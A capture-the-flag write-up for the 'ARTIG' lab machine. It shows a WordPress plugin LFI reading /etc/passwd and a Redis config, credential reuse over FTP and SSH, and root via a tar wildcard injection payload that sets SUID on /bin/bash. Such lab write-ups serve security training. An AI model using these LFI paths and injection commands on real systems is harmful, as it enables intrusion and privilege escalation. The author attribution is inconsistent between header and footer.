# 🏴 CTF Write-up: ARTIG — LFI to Root via Tar Wildcard Injection

> **Machine:** ARTIG
> **Tags:** `WordPress` `LFI` `FTP` `Cron Job` `Tar Wildcard Injection` `SUID`
> **Author:** Havk

---

## 📡 1. Reconnaissance

Starting with a standard scan against the target:

```bash
nmap -sV -sC -p- --min-rate 5000 artig.hvm
```

The target was running **WordPress**. To automate vulnerability discovery, I installed and ran **Nuclei**:

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
export PATH=$PATH:$(go env GOPATH)/bin

nuclei -u http://artig.hvm
```

---

## 🔍 2. LFI Discovery via Nuclei

Nuclei flagged a **Local File Inclusion (LFI)** vulnerability in the **Site Editor** WordPress plugin:

```
http://artig.hvm/wp-content/plugins/site-editor/editor/extensions/
pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/
```

This parameter accepts a file path and includes it directly — a classic **unauthenticated LFI**.

---

## 📂 3. Extracting Sensitive Files via LFI

### 3.1 — Reading `/etc/passwd`

```
?ajax_path=/etc/passwd
```

**Discovered users and their shells:**
- `mario` — FTP / Shell access
- `max` — **SSH TTY** (confirmed by the `/etc/passwd` entry)
- `www-data`

> 📝 **Important note:** Seeing that `max` had a valid SSH TTY shell assigned in `/etc/passwd` was a key detail I kept in mind for later.

---

### 3.2 — Redis Configuration Leak

```
?ajax_path=/etc/redis/redis.conf
```

Found a password inside the Redis config:

```
requirepass washington
```

> ⚠️ **Rabbit Hole:** I initially assumed `washington` was the **Redis database password** and tried authenticating to Redis with it. This failed. The real use of this credential came later — it turned out to be **mario's FTP password**.

---

## 🔑 4. Gaining Initial Access

### 4.1 — FTP Login as `mario` → Full Shell

Using the credentials discovered via the Redis config leak:

```bash
ftp artig.hvm
# Username: mario
# Password: washington
```

✅ Login successful. Crucially, this was **not a restricted FTP jail** — `mario` had a **fully interactive shell** on the system.

---

### 4.2 — Discovering the WordPress Backup File

From within mario's shell, I enumerated the filesystem and found a **backup archive** of the `/var/www/html` directory:

```bash
ls -la /var/www/html/
```

Inside, I found:

```
wp-configg.php.bak
```

```bash
cat /var/www/html/wp-configg.php.bak
```

This backup config contained **database credentials** — specifically credentials associated with the **Redis user `max`**.

> 🔑 **Key insight:** Earlier, via LFI on `/etc/passwd`, I had confirmed that `max` had a valid **SSH TTY** assigned. Putting two and two together, I tested these credentials not for Redis — but for **SSH as `max`**. It worked.

---

### 4.3 — SSH Login as `max`

```bash
ssh max@artig.hvm
# Password: <found in wp-configg.php.bak>
```

✅ **Stable SSH shell as `max` acquired.**

---

## ⚙️ 5. Privilege Escalation

### 5.1 — Sudo Check

```bash
sudo -l
```

```text
User max may run the following commands on Artig:
    (www-data) NOPASSWD: /bin/bash
```

`max` can run `/bin/bash` as `www-data` without a password:

```bash
sudo -u www-data /bin/bash
```

✅ Shell as **`www-data`** obtained.

> ⚠️ **Attempted:** `/bin/bash -p` — did **not** escalate to root. The SUID flag was not yet set. A different path was needed.

---

### 5.2 — Discovering the Cron Job

While enumerating as `www-data`, I found a **root-owned cron job** at:

```bash
cat /opt/backup.sh
```

```bash
#!/bin/bash
cd /var/www/html
tar czf /root/backup.tar.gz *
```

**Key observations:**
- Runs as **root**
- Uses `tar` with a **wildcard `*`** inside `/var/www/html`
- `www-data` has **write access** to `/var/www/html`

This is a classic **Tar Wildcard Injection** vulnerability. 🎯

---

### 5.3 — Exploiting Tar Wildcard Injection

When `tar` expands `*`, the shell substitutes all filenames in the directory as command-line arguments. By crafting filenames that look like `tar` flags, we can force `tar` to **execute arbitrary commands as root**.

**Step 1 — Create the malicious payload:**

```bash
echo 'chmod +s /bin/bash' > shell.sh
chmod +x shell.sh
```

**Step 2 — Create the tar flag files:**

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

**Step 3 — Wait for the cron job (~1 minute)**

When cron fires, `tar` expands `*` and effectively runs:

```bash
tar czf /root/backup.tar.gz [...] --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

Which causes `tar` to **execute `shell.sh` as root**.

**Step 4 — Verify SUID was set:**

```bash
ls -la /bin/bash
```

```text
-rwsr-sr-x 1 root root 1298416 Mar 8 11:21 /bin/bash
```

✅ **SUID bit successfully set on `/bin/bash`!**

---

### 5.4 — Spawning the Root Shell

```bash
/bin/bash -p
```

```text
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
root.txt
```

---

## 🏆 6. Root Flag Captured

```bash
cat /root/root.txt
```

```
[ROOT FLAG]
```

**ROOTED! 🚩**

---

## 📝 Summary Table

| Step | Action | Result |
|------|--------|--------|
| 1 | Nuclei scan on WordPress | Found LFI in Site Editor plugin |
| 2 | LFI → `/etc/passwd` | Confirmed `max` has SSH TTY |
| 3 | LFI → `/etc/redis/redis.conf` | Found password `washington` |
| 4 | Tested `washington` on Redis | ❌ Failed — rabbit hole |
| 5 | FTP as `mario` / `washington` | ✅ Full interactive shell |
| 6 | Found `wp-configg.php.bak` via mario's shell | Found credentials for `max` |
| 7 | SSH as `max` (Redis creds = SSH pass) | ✅ Stable foothold |
| 8 | `sudo -u www-data /bin/bash` | Pivoted to `www-data` |
| 9 | Discovered `/opt/backup.sh` cron | Tar wildcard injection vector |
| 10 | Created `shell.sh` + flag files | Waited for cron to trigger |
| 11 | `/bin/bash -p` | **Root shell** 🏴 |

---

## 🧠 Key Takeaways

- **Always cross-reference credentials** — `washington` failed on Redis but worked on FTP. Never assume a credential belongs to only one service.
- **`/etc/passwd` reveals more than just usernames** — the assigned shell can tell you *how* a user can authenticate.
- **Full FTP shells are goldmines** — don't treat FTP access as low-value; explore the filesystem thoroughly.
- **Backup files leak secrets** — `.bak` files are almost always forgotten and contain sensitive data.
- **Tar wildcard injection is a timeless classic** — write access to a directory used by a root cron `tar *` command is game over.

---

*Write-up by **ToM** | Ethical Hacker*